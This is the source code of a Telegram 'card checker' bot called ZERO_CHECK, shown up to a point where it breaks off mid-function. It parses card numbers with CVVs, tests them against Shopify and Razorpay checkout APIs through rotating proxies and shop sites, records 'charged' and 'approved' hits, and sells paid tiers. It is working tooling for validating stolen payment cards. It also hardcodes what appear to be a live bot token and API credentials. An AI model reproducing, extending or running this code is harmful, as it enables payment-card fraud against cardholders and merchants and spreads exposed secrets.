# =============================================================================
# ZERO_CHECK BOT — FINAL UNIFIED VERSION
# Bot13 command set + smart architecture (MongoDB, per-user semaphores,
# SmartRotator, no auto-ban) + promotional banner.
# Brand: ZERO_CHECK | Owner: SUPERGREMLIN
# =============================================================================

import logging, asyncio, aiohttp, aiofiles, os, random, time, json, re, string, socket, platform
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote
from typing import Optional, List, Dict, Any, Tuple
from telethon import TelegramClient, events, Button
from telethon.errors import UserNotParticipantError, ChatAdminRequiredError, ChannelPrivateError, FloodWaitError
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.tl.types import MessageEntityCustomEmoji, ChannelParticipantBanned
from telethon.extensions import html as thtml
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

# ─── Logging ────────────────────────────────────────────────────────────────
log = logging.getLogger("ZERO_CHECK")
log.setLevel(logging.INFO)
_fmt = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
_ch = logging.StreamHandler(); _ch.setLevel(logging.INFO); _ch.setFormatter(_fmt); log.addHandler(_ch)
try:
    _fh = logging.FileHandler('zero_check_bot.log', encoding='utf-8'); _fh.setLevel(logging.INFO); _fh.setFormatter(_fmt); log.addHandler(_fh)
except: pass
def log_user(uid, action, msg, level="info"): getattr(log, level, log.info)(f"[USER:{uid}] [{action}] {msg}")
def log_system(action, msg, level="info"): getattr(log, level, log.info)(f"[SYSTEM] [{action}] {msg}")

# ─── MongoDB ────────────────────────────────────────────────────────────────
from motor.motor_asyncio import AsyncIOMotorClient
MONGO_URL = os.getenv("MONGO_URL", "mongodb://localhost:27017")
DB_NAME = os.getenv("DB_NAME", "zero_check_bot")
mongo_client = AsyncIOMotorClient(MONGO_URL); db = mongo_client[DB_NAME]
users_col = db["users"]; keys_col = db["keys"]; proxies_col = db["proxies"]; sites_col = db["sites"]
cards_col = db["cards"]; global_sites_col = db["global_sites"]; joined_col = db["joined_users"]
rank_col = db["rank"]

async def init_db():
    try:
        await users_col.create_index("user_id", unique=True)
        await keys_col.create_index("key", unique=True)
        await proxies_col.create_index([("user_id", 1), ("proxy_url", 1)])
        await sites_col.create_index([("user_id", 1), ("site", 1)])
        await global_sites_col.create_index("site", unique=True)
        await cards_col.create_index("created_at")
        await joined_col.create_index("user_id", unique=True)
        await rank_col.create_index("user_id", unique=True)
        log_system("DB", "MongoDB indexes created")
    except Exception as e:
        log_system("DB", f"Index warning: {e}", "warning")

# ─── Database helpers ──────────────────────────────────────────────────────
async def ensure_user(uid):
    if not await users_col.find_one({"user_id": uid}):
        await users_col.insert_one({"user_id": uid, "plan": "Bronze", "expiry": None, "banned": False, "created_at": datetime.utcnow()})
async def get_user_plan(uid):
    u = await users_col.find_one({"user_id": uid})
    if not u: return "Bronze"
    plan = u.get("plan", "Bronze"); exp = u.get("expiry")
    if exp and datetime.utcnow() > exp:
        await users_col.update_one({"user_id": uid}, {"$set": {"plan": "Bronze", "expiry": None}}); return "Bronze"
    return plan
async def set_user_plan(uid, plan, days=0):
    exp = datetime.utcnow() + timedelta(days=days) if days > 0 else None
    await users_col.update_one({"user_id": uid}, {"$set": {"plan": plan, "expiry": exp, "updated_at": datetime.utcnow()}}, upsert=True)
async def is_premium_user(uid): return await get_user_plan(uid) in ["Core", "Elite", "Root", "X"]
async def is_banned_user(uid):
    u = await users_col.find_one({"user_id": uid}); return u.get("banned", False) if u else False
async def mark_user_joined(uid): await joined_col.update_one({"user_id": uid}, {"$set": {"joined_at": datetime.utcnow()}}, upsert=True)
async def remove_joined_mark(uid): await joined_col.delete_one({"user_id": uid})

async def add_proxy_db(uid, pd):
    await proxies_col.insert_one({"user_id": uid, "ip": pd.get("ip"), "port": pd.get("port"), "username": pd.get("username"), "password": pd.get("password"), "proxy_url": pd.get("proxy_url"), "proxy_type": pd.get("type", "http"), "added_at": datetime.utcnow()})
async def get_all_user_proxies(uid):
    return await proxies_col.find({"user_id": uid}).sort("added_at", 1).to_list(length=200)
async def get_proxy_count(uid): return await proxies_col.count_documents({"user_id": uid})
async def remove_proxy_by_index(uid, idx):
    px = await get_all_user_proxies(uid)
    if 0 <= idx < len(px):
        p = px[idx]; await proxies_col.delete_one({"_id": p["_id"]}); return p
    return None
async def clear_all_proxies(uid): return (await proxies_col.delete_many({"user_id": uid})).deleted_count

async def add_site_db(uid, site):
    if await sites_col.find_one({"user_id": uid, "site": site}): return False
    await sites_col.insert_one({"user_id": uid, "site": site, "added_at": datetime.utcnow()}); return True
async def get_user_sites(uid): return [d["site"] for d in await sites_col.find({"user_id": uid}).to_list(length=50000)]
async def remove_site_db(uid, site): return (await sites_col.delete_one({"user_id": uid, "site": site})).deleted_count > 0
async def get_global_sites(): return [d["site"] for d in await global_sites_col.find().to_list(length=10000)]

async def save_card_to_db(card, status, resp, gw, price):
    await cards_col.insert_one({"card": card, "status": status, "response": resp, "gateway": gw, "price": price, "created_at": datetime.utcnow()})
async def increment_charge_count(uid): await rank_col.update_one({"user_id": uid}, {"$inc": {"charged_count": 1}}, upsert=True)
async def get_rank_data(limit=10): return await rank_col.find().sort("charged_count", -1).limit(limit).to_list(length=limit)
async def get_total_users(): return await users_col.count_documents({})
async def get_premium_count(): return await users_col.count_documents({"plan": {"$in": ["Core", "Elite", "Root", "X"]}})
async def get_total_sites_count(): return await sites_col.count_documents({})
async def get_total_cards_count(): return await cards_col.count_documents({})
async def get_charged_count(): return await cards_col.count_documents({"status": "CHARGED"})
async def get_approved_count(): return await cards_col.count_documents({"status": "APPROVED"})

# ─── Bold Sans ──────────────────────────────────────────────────────────────
_BOLD_SANS_MAP = {}
_upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"; _lower = "abcdefghijklmnopqrstuvwxyz"; _digits = "0123456789"
_bold_upper = "𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭"; _bold_lower = "𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝘂𝘃𝘄𝘅𝘆𝘇"; _bold_digits = "𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵"
for i, c in enumerate(_upper): _BOLD_SANS_MAP[c] = _bold_upper[i]
for i, c in enumerate(_lower): _BOLD_SANS_MAP[c] = _bold_lower[i]
for i, c in enumerate(_digits): _BOLD_SANS_MAP[c] = _bold_digits[i]
def bs(text):
    if not text: return text
    return "".join(_BOLD_SANS_MAP.get(c, c) for c in str(text))

# ─── Premium Emojis ────────────────────────────────────────────────────────
PREMIUM_EMOJI_IDS = {
    "✅": "5278327121008167894", "❌": "5040042498634810056", "⚠️": "5420323339723881652",
    "⚡": "6174996123522959140", "⚡️": "6174996123522959140", "🔥": "5039644681583985437",
    "💎": "5427168083074628963", "✔️": "5206607081334906820", "✨": "5040016479722931047",
    "🎉": "5039778134807806727", "🎊": "5039778134807806727", "🎯": "5039905162760553480",
    "⛔️": "6181277564732972292", "⛔": "6181277564732972292", "🛑": "6181277564732972292",
    "🚨": "5039671744172917707", "💰": "5039789890133296083", "💳": "5447453226498552490",
    "💲": "5447579253723918909", "💵": "5409048419211682843", "💸": "5837027045376271166",
    "💱": "5039789890133296083", "🏦": "6089185885289454318", "🏧": "5447453226498552490",
    "🖥": "5039579582764680065", "📊": "5042290883949495533", "📈": "5039808285478224750",
    "📉": "5039759318556083411", "🥇": "6179279816529814743", "🏆": "6089185885289454318",
    "👑": "5039727497143387500", "👤": "5992129361090711368", "🧑": "5992129361090711368",
    "👾": "6181389246767570324", "😈": "6336664426325740768", "👿": "6181349715888577684",
    "🐶": "6181480793995483763", "🐍": "5116298753917060171", "🤖": "6174896506051495705",
    "⚙️": "5445059250382469069", "⚙": "5445059250382469069", "⚒": "5445059250382469069",
    "🔌": "5445059250382469069", "🌐": "6321225560789877992", "ℹ️": "5334544901428229844",
    "🏳️": "5256143829672672750", "📍": "5391032818111363540", "🇺🇸": "6034969533859499947",
    "📡": "5447448489149625830", "🔔": "5042111805288089118", "🛡": "5042328396193864923",
    "🔑": "5399885604701880145", "🗝": "5399885604701880145", "🔒": "5445059250382469069",
    "🔓": "5445373981290952548", "🔗": "5042101437237036298", "⏰": "5445350406215465190",
    "⏱️": "5445350406215465190", "🚀": "6174445826543191998", "☄️": "5224607267797606837",
    "⭐": "5042061201983407048", "⭐️": "5042176294222037888", "💫": "5042200814190330758",
    "🔮": "5042302287087666158", "💙": "5300842752618018643", "💖": "5039643719511311434",
    "❤": "5040072842578756396", "🌍": "5447410659077661506", "🌎": "5447410659077661506",
    "🏪": "6089185885289454318", "🔰": "5042328396193864923", "📧": "5443127283898405358",
    "🔐": "5445059250382469069", "💀": "5042209657527993345", "💯": "5042297717242463211",
    "🚫": "5039671744172917707", "🎀": "5039953030171067177", "🧨": "5039778134807806727",
    "🃏": "6028206863038811654", "💡": "5042264341051605743", "👩‍💻": "5445224894386172410",
    "💬": "5040036030414062506", "📌": "5397782960512444700", "📋": "5445260044398524944",
    "📝": "5444889156792646660", "📁": "6026239398650056451", "🗂": "5447210891558814377",
    "🗑": "5039614900280754969", "🗑️": "5039614900280754969", "📅": "6168242008277125889",
    "📤": "5445355530111437729", "📥": "5443127283898405358", "🆕": "5041852827350074289",
    "🟢": "5039928501612839813", "🔴": "5042042652019655612", "🟡": "6025833352441893055",
    "🔁": "5348386034835015762", "⏸": "5042036407137207122", "▶️": "5039753786638205957",
    "⏹": "5134537521518085000", "🧹": "5039751080808809534", "⏱": "6186053057265016346",
    "⏳": "5042036407137207122", "🔢": "5042290883949495533", "🎟": "5377624166436445368",
    "🔧": "5445059250382469069", "💠": "5427168083074628963", "🥈": "6179279816529814743",
    "🔍": "5042302287087666158", "💻": "5039579582764680065", "📩": "5443127283898405358",
    "🔀": "5348386034835015762",
}
BUTTON_CUSTOM_EMOJIS = {
    "✅": "5278327121008167894", "❌": "5785177332595561481", "↪️": "5445365692004071819",
    "®️": "5445373981290952548", "🔥": "5039644681583985437", "⚡": "6174996123522959140",
    "⭐": "5042061201983407048", "🚀": "6174445826543191998", "⚙️": "5445059250382469069",
    "📡": "5447448489149625830", "✋": "5408900479063175258", "💫": "5042200814190330758",
    "💎": "5427168083074628963", "🌐": "6321225560789877992", "🔮": "5042302287087666158",
    "⚠️": "5420323339723881652", "🛡": "5042328396193864923", "🛡️": "5042328396193864923",
    "💰": "5039789890133296083", "👑": "5039727497143387500", "🤖": "6174896506051495705",
    "📋": "5445260044398524944", "🏧": "5447453226498552490", "💙": "5300842752618018643",
    "💳": "5447453226498552490", "⏰": "5445350406215465190", "💻": "5039579582764680065",
    "🔑": "5399885604701880145", "🔓": "5445373981290952548", "🔌": "6321225560789877992",
    "🛠️": "5445059250382469069", "🔙": "5445365692004071819",
}
CE = {"crown":5039727497143387500,"bolt":5042334757040423886,"brain":5040030395416969985,"shield":5042328396193864923,"star":5042176294222037888,"gem":5042050649248760772,"check":5039793437776282663,"fire":5039644681583985437,"party":5039778134807806727,"search":5039649904264217620,"chart":5042290883949495533,"pin":5039600026809009149,"joker":5039998939076494446,"plus":5039891861246838069,"cross":5040042498634810056,"info":5042306247047513767,"gift":5041975203853239332,"eyes":5039623284056917259,"trash":5039614900280754969,"tick":5039844895779455925,"stop":5039671744172917707,"warn":5039665997506675838,"link":5042101437237036298,"globe":5042186567783809934,"restart":5413554170668032766,"online":5413813953685923984,"declined":4956612582816351459}
PE = "⭐"

def pe(text):
    if not text: return text
    for emoji, doc_id in PREMIUM_EMOJI_IDS.items():
        text = text.replace(emoji, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return text

def inline_btn(label, data, style=None, **kwargs):
    icon_emoji = kwargs.pop('icon', None); icon_id = None
    if icon_emoji: icon_id = BUTTON_CUSTOM_EMOJIS.get(icon_emoji)
    if not icon_id:
        for e, doc in BUTTON_CUSTOM_EMOJIS.items():
            if e in label: icon_id = int(doc); break
    clean = label.replace(icon_emoji, '').strip() if icon_emoji and icon_emoji in label else label
    return Button.inline(clean, data, icon=int(icon_id) if icon_id else None, style=style, **kwargs)

# ─── Constants ──────────────────────────────────────────────────────────────
SEP = "━━━━━━━━━━━━━━━━━"
DEV_LINE = f"⌬ {bs('Bot By')} <a href='https://t.me/SUPERGREMLIN01'>@SUPERGREMLIN01</a>"
API_ID = 33657928
API_HASH = 'a61fde61442113b9a65c699f7020d59a'
BOT_TOKEN = '8959519162:AAHujZTeacMlNioh3LvqlvgWSSifHbg7oK4'
ADMIN_ID = [5826575488, 8871910561]
HITS_CHANNEL_ID = -1004381920430
CHARGED_ONLY_CHANNEL_ID = -1003965573664
LOG_CHANNEL_ID = HITS_CHANNEL_ID
BOT_BRAND = "ZERO_CHECK"
OWNER_NAME = "SUPERGREMLIN"
OWNER_USERNAME = "@SUPERGREMLIN01"
JOIN_GROUP_ID = -1003902938287
JOIN_CHANNEL_ID = -1004381920430
JOIN_GROUP_LINK = "https://t.me/+6rGC4rCRLek5NDVl"
JOIN_CHANNEL_LINK = "https://t.me/+7hJ8-jOuoWJkZTQ9"
SHOPIFY_API_URL = "https://shopify-api-production-90e8.up.railway.app/check"
RAZORPAY_API_URL = "https://web-production-43fc5.up.railway.app/razorpay/check"

# ─── Video Management ──────────────────────────────────────────────────────
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
VIDEO_DIR = os.path.join(BASE_DIR, "videos"); os.makedirs(VIDEO_DIR, exist_ok=True)
DEFAULT_WELCOME = "welcome.mp4"
DEFAULT_HIT_VIDEOS = [f"hit{i}.mp4" for i in range(1, 15)]
def get_welcome_video_path():
    p = os.path.join(VIDEO_DIR, "welcome.mp4"); return p if os.path.exists(p) else DEFAULT_WELCOME
def get_hit_video_paths():
    try:
        files = [f for f in os.listdir(VIDEO_DIR) if f.startswith("hit") and f.endswith(".mp4")]
        if files: return [os.path.join(VIDEO_DIR, f) for f in sorted(files)]
    except: pass
    return [f for f in DEFAULT_HIT_VIDEOS if os.path.exists(f)]

# ─── Plans ──────────────────────────────────────────────────────────────────
PLANS = {
    "plan1": {"name": bs("Core Access"), "tier": "Core", "duration_days": 7, "emoji": "🛠️", "price": "$10"},
    "plan2": {"name": bs("Elite Access"), "tier": "Elite", "duration_days": 15, "emoji": "👑", "price": "$15"},
    "plan3": {"name": bs("Root Access"), "tier": "Root", "duration_days": 30, "emoji": "⭐", "price": "$25"},
    "plan4": {"name": bs("X-Access"), "tier": "X", "duration_days": 90, "emoji": "💎", "price": "$60"},
}
PAID_TIERS = ["Core", "Elite", "Root", "X"]
def is_paid_plan(plan): return plan.title() in PAID_TIERS if plan else False
def get_cc_limit(plan, uid=None):
    if uid and uid in ADMIN_ID: return 999999
    p = plan.title() if plan else "Bronze"
    return {"X":999999,"Root":999999,"Elite":999999,"Core":999999}.get(p, 0)

# ─── Free tier ──────────────────────────────────────────────────────────────
FREE_SP_DAILY_LIMIT = 15; FREE_SP_COOLDOWN = 10
_FREE_SP_USAGE = {}; _FREE_SP_LAST_USE = {}
def _today(): return datetime.now().strftime("%Y-%m-%d")
def get_free_sp_usage(uid):
    e = _FREE_SP_USAGE.get(uid)
    if not e or e.get("date") != _today(): _FREE_SP_USAGE[uid] = {"date": _today(), "count": 0}; return 0
    return e["count"]
def increment_free_sp_usage(uid):
    e = _FREE_SP_USAGE.get(uid)
    if not e or e.get("date") != _today(): _FREE_SP_USAGE[uid] = {"date": _today(), "count": 1}
    else: _FREE_SP_USAGE[uid]["count"] += 1
def get_free_sp_cooldown_remaining(uid):
    last = _FREE_SP_LAST_USE.get(uid, 0); elapsed = time.time() - last
    return round(FREE_SP_COOLDOWN - elapsed, 1) if elapsed < FREE_SP_COOLDOWN else 0
def set_free_sp_last_use(uid): _FREE_SP_LAST_USE[uid] = time.time()

# ─── Per‑user Semaphores ───────────────────────────────────────────────────
_USER_SEMS = {}; _BIN_SEM = asyncio.Semaphore(20)
SP_PER_USER_WORKERS = 30; MSP_PER_USER_WORKERS = 70; RZ_PER_USER_WORKERS = 30
MRZ_PER_USER_WORKERS = 50; SITE_PER_USER_WORKERS = 30; PROXY_PER_USER_WORKERS = 50
def get_user_sem(uid, sem_type="msp"):
    key = f"{uid}_{sem_type}"
    if key not in _USER_SEMS:
        limits = {"sp":SP_PER_USER_WORKERS,"msp":MSP_PER_USER_WORKERS,"rz":RZ_PER_USER_WORKERS,"mrz":MRZ_PER_USER_WORKERS,"site":SITE_PER_USER_WORKERS,"proxy":PROXY_PER_USER_WORKERS}
        _USER_SEMS[key] = asyncio.Semaphore(limits.get(sem_type, 30))
    return _USER_SEMS[key]
def cleanup_user_sem(uid):
    for k in [k for k in _USER_SEMS if k.startswith(f"{uid}_")]: del _USER_SEMS[k]

# ─── HTTP Sessions ─────────────────────────────────────────────────────────
_USER_HTTP_SESSIONS = {}; _GLOBAL_BIN_SESSION = None; _GLOBAL_PROXY_SESSION = None
API_TIMEOUT = 60; BIN_TIMEOUT = 60; PROXY_TIMEOUT = 12; RZ_TIMEOUT = 60
async def get_user_http_session(uid, purpose="general"):
    key = f"{uid}_{purpose}"; s = _USER_HTTP_SESSIONS.get(key)
    if s is None or s.closed:
        to = RZ_TIMEOUT if purpose in ("rz","mrz") else API_TIMEOUT
        conn = aiohttp.TCPConnector(limit=150, limit_per_host=50, ttl_dns_cache=300, use_dns_cache=True, keepalive_timeout=30, enable_cleanup_closed=True)
        s = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=to, connect=10), connector=conn)
        _USER_HTTP_SESSIONS[key] = s
    return s
async def cleanup_user_http_session(uid, purpose="general"):
    s = _USER_HTTP_SESSIONS.pop(f"{uid}_{purpose}", None)
    if s and not s.closed:
        try: await s.close()
        except: pass
async def get_bin_session():
    global _GLOBAL_BIN_SESSION
    if _GLOBAL_BIN_SESSION is None or _GLOBAL_BIN_SESSION.closed:
        _GLOBAL_BIN_SESSION = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=BIN_TIMEOUT, connect=5), connector=aiohttp.TCPConnector(limit=50, limit_per_host=20, ttl_dns_cache=300, use_dns_cache=True))
    return _GLOBAL_BIN_SESSION
async def get_proxy_session():
    global _GLOBAL_PROXY_SESSION
    if _GLOBAL_PROXY_SESSION is None or _GLOBAL_PROXY_SESSION.closed:
        _GLOBAL_PROXY_SESSION = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT, connect=15), connector=aiohttp.TCPConnector(limit=30, limit_per_host=10, ttl_dns_cache=300, use_dns_cache=True))
    return _GLOBAL_PROXY_SESSION

# ─── Message Helpers ────────────────────────────────────────────────────────
def build_entities(html_text, emoji_ids=None):
    text, entities = thtml.parse(html_text)
    if emoji_ids:
        idx, pos = 0, 0
        for ch in text:
            if ch == PE and idx < len(emoji_ids):
                entities.append(MessageEntityCustomEmoji(offset=pos, length=1, document_id=emoji_ids[idx])); idx += 1
            pos += 2 if ord(ch) > 0xFFFF else 1
    return text, sorted(entities, key=lambda e: e.offset)

async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(event.reply(text, formatting_entities=entities, buttons=buttons, file=file, link_preview=False), timeout=15)
    except:
        try: return await asyncio.wait_for(event.reply(html_text[:4000], parse_mode='html', link_preview=False), timeout=10)
        except: return None

async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(client_instance.send_message(chat_id, text, formatting_entities=entities, buttons=buttons, file=file, link_preview=False), timeout=15)
    except: return None

async def styled_edit(msg, html_text, buttons=None, emoji_ids=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        await asyncio.wait_for(msg.edit(text, formatting_entities=entities, buttons=buttons, link_preview=False), timeout=8)
    except: pass

def pbtn(text, data=None, url=None):
    if url: return Button.url(text, url)
    if data: return Button.inline(text, data.encode() if isinstance(data, str) else data)
    return Button.inline(text, b"none")

# ─── Utilities ──────────────────────────────────────────────────────────────
def extract_cc(text):
    if not text: return []
    cards = []
    for c,m,y,cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        if len(y) == 2: y = '20'+y
        cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c,m,y,cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text): cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c,m,y,cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text): cards.append(f"{c}|{m}|20{y}|{cv}")
    return list(dict.fromkeys(cards))

def normalize_site_url(url):
    url = url.strip().lower(); url = re.sub(r'^https?://', '', url).rstrip('/')
    if url.startswith('www.'): url = url[4:]
    if '/' in url: url = url.split('/')[0]
    return url

def is_valid_url_or_domain(url):
    d = url.lower()
    if d.startswith(('http://','https://')):
        try: d = urlparse(url).netloc
        except: return False
    return bool(re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$', d))

def extract_urls_from_text(text):
    seen, res = set(), []
    for line in text.split('\n'):
        line = line.strip()
        if not line: continue
        m = re.match(r'(https?://[^\s{(]+)', line)
        if m:
            n = normalize_site_url(m.group(1).rstrip('/'))
            if n and is_valid_url_or_domain(n) and n not in seen: seen.add(n); res.append(n)
            continue
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line).split(' ')[0].split('{')[0].strip()
        if cleaned:
            n = normalize_site_url(cleaned)
            if n and is_valid_url_or_domain(n) and n not in seen: seen.add(n); res.append(n)
    return res

def parse_proxy_format(proxy):
    proxy = proxy.strip(); pt = 'http'
    pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.I)
    if pm: pt, proxy = pm.group(1).lower(), pm.group(2)
    h = p = u = pw = ''
    m = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if m: u,pw,h,p = m.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        m2 = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy); ph,pp,pu,ppw = m2.groups()
        if 0 < int(pp) <= 65535: h,p,u,pw = ph,pp,pu,ppw
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        m3 = re.match(r'^([^:@]+):(\d+)$', proxy); h,p = m3.groups()
    else: return None
    if not h or not p: return None
    try:
        if not (0 < int(p) <= 65535): return None
    except: return None
    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
    return {'ip':h,'port':p,'username':u or None,'password':pw or None,'proxy_url':pu,'type':pt}

async def test_proxy(proxy_url):
    try:
        s = await get_proxy_session()
        async with s.get('http://api.ipify.org?format=json', proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT)) as r:
            if r.status == 200: return True, (await r.json()).get('ip','?')
            return False, None
    except Exception as e: return False, str(e)

async def get_bin_info(cn):
    try:
        s = await get_bin_session()
        async with _BIN_SEM:
            async with s.get(f'https://bins.antipublic.cc/bins/{cn[:6]}') as r:
                if r.status != 200: return {"brand":"-","type":"-","level":"-","bank":"-","country":"-","flag":"🏳️"}
                d = await r.json(content_type=None)
                return {"brand":d.get('brand','-'),"type":d.get('type','-'),"level":d.get('level','-'),"bank":d.get('bank','-'),"country":d.get('country_name','-'),"flag":d.get('country_flag','🏳️')}
    except: return {"brand":"-","type":"-","level":"-","bank":"-","country":"-","flag":"🏳️"}

# ─── Smart Rotator ─────────────────────────────────────────────────────────
class SmartRotator:
    def __init__(self): self._site_fails = {}; self._proxy_fails = {}; self._site_idx = 0; self._proxy_idx = 0
    def pick_site(self, sites, exclude=None):
        if not sites: return None
        exclude = exclude or set()
        avail = [s for s in sites if s not in exclude and self._site_fails.get(s,0) < 5]
        if not avail: avail = [s for s in sites if s not in exclude] or list(sites)
        self._site_idx = (self._site_idx + 1) % len(avail); return avail[self._site_idx]
    def pick_proxy(self, proxies, exclude=None):
        if not proxies: return None
        exclude = exclude or set()
        avail = [p for p in proxies if p.get('proxy_url') not in exclude and self._proxy_fails.get(p.get('proxy_url'),0) < 5]
        if not avail: avail = [p for p in proxies if p.get('proxy_url') not in exclude] or list(proxies)
        self._proxy_idx = (self._proxy_idx + 1) % len(avail); return avail[self._proxy_idx]
    def report_site_ok(self, site): self._site_fails[site] = 0
    def report_site_fail(self, site): self._site_fails[site] = self._site_fails.get(site,0)+1
    def report_proxy_ok(self, url):
        if url: self._proxy_fails[url] = 0
    def report_proxy_fail(self, url):
        if url: self._proxy_fails[url] = self._proxy_fails.get(url,0)+1

# ─── Error detection ──────────────────────────────────────────────────────
SITE_ERROR_KEYWORDS = [
    'r4 token empty','payment method is not shopify','r2 id empty','product id is empty','py id empty','clinte token',
    'receipt_empty','receipt id is empty','receipt empty','site requires login','failed to get token','no valid products',
    'not shopify','failed to get checkout','failed to detect product','failed to create checkout','failed to get proposal data',
    'site not supported','site error! status: 429','token not found','handle is empty','payment method identifier is empty',
    'failed to get session token','failed to tokenize card','no_session_token','no session token','no checkout token found',
    'checkout token not found','no checkout token','checkout token is empty','tokenize_fail','tokenize fail','tax ammount empty',
    'tax amount empty','tax amount is empty','del ammount empty','site not supported for now','payment base card not supported',
    'no product found','checkout is not available','cart is empty','cart add failed after retries','checkout_expired',
    'checkout_not_found','no shipping methods available','site error','site dead','site errors','server error','internal server error',
    'internal_server_error','application error','unexpected error','something went wrong','error in 1st req','error in 1 req',
    'error processing card','we could not process','unable to process','payment provider error','payment gateway error','session expired',
    'session invalid','failed after retries','max retries exceeded','all sites dead','all sites unavailable','processinf error',
    'handle error','nonetype',"nonetype' object has no attribute 'get",'unknown error','unknown_error','unknown_result','utm_source',
    'shop is unavailable','store is unavailable','store not found','page not found','this store is unavailable',
    'this shop is currently unavailable','password protected','enter store using password','storefront is password protected',
    'shop closed','store closed','delivery_delivery_line_detail_changed','delivery_address2_required','delivery_line_detail_changed',
    'delivery_line','delivery_address','address_required','submit_rejected','submit rejected:','change proxy or site','change site',
    'fake charge gate','fake gate','hcaptcha detected','hcaptcha_detected','captcha at checkout','captcha_required','captcha required',
    'cloudflare','access denied','permission denied','connection error','connection failed','timed out','timeout','could not resolve host',
    'connect tunnel failed','unreachable','network error','connection reset','empty reply from server','tlsv1 alert','ssl routines',
    'openssl ssl_connect','api_timeout','http error','httperror504','502','503','504','bad gateway','service unavailable','gateway timeout',
    'site error! status: 404','site error! status: 401','amount_too_small','amount too small','merchandise_not_enough_stock',
    'product out of stock','malformed input','url rejected','invalid_response','cart failed with status','invalid json response',
    'invalid json','inventoryreservationfailure','inventory_reservation_failure','payments_positive_amount_expec',
    'payments_payment_flexibility_t','payments_credit_card_brand_not','buyer_identity_presentment_currency',"'products'","error:","error: '",
    'unable to get payment token','empty submit response','empty submit','order_total_changed','order total changed',
    'invalid_payment_method','invalid payment method','validation_custom','validation custom','ARTIFACT_DISSATISFACTION',
    'artifact_dissatisfaction','TAX_NEW_TAX_MUST_BE_ACCEPTED','tax_new_tax_must_be_accepted','PROCESSING_ERROR','processing_error',
    'DELIVERY_COMPANY_REQUIRED','delivery_company_required','DECISION_RULE_BLOCK','decision_rule_block','timeout'
]
PROXY_ERROR_KEYWORDS = ['proxy dead','proxy error','proxy timeout','proxy connection failed','proxy refused']
RZ_RETRY_KEYWORDS = ['payment id not found','payment_id_not_found','timeout','timed out','connection error','connection failed',
    'connection reset','server error','internal server error','502','503','504','bad gateway','service unavailable','gateway timeout',
    'empty reply','invalid json','could not resolve host','network error','ssl routines','unreachable','proxy dead','proxy error',
    'proxy timeout','DEAD | Payment ID not found','timeout']

def is_site_error(t):
    if not t: return True
    l = t.lower().strip()
    if l == 'na': return True
    return any(k in l for k in SITE_ERROR_KEYWORDS)
def is_proxy_error(t):
    return bool(t) and any(k in t.lower().strip() for k in PROXY_ERROR_KEYWORDS)
def is_rz_retry_error(t):
    if not t: return True
    l = t.lower().strip()
    return any(k in l for k in RZ_RETRY_KEYWORDS)

# ─── Formatting ────────────────────────────────────────────────────────────
def format_simple_card_result(status, card, gateway, response, bin_info=None, elapsed=0.0, extra_field=None):
    sm = {"Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
          "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
          "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
          "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]])}
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand":"-","type":"-","level":"-","bank":"-","country":"-","flag":"🏳️"}
    el = f"\n<b>{bs(extra_field[0])}</b> ━ <code>{extra_field[1]}</code>" if extra_field else ""
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='https://t.me/SUPERGREMLIN01'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>{el}
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand','-')} | {bi.get('type','-')} | {bi.get('level','-')}</code>
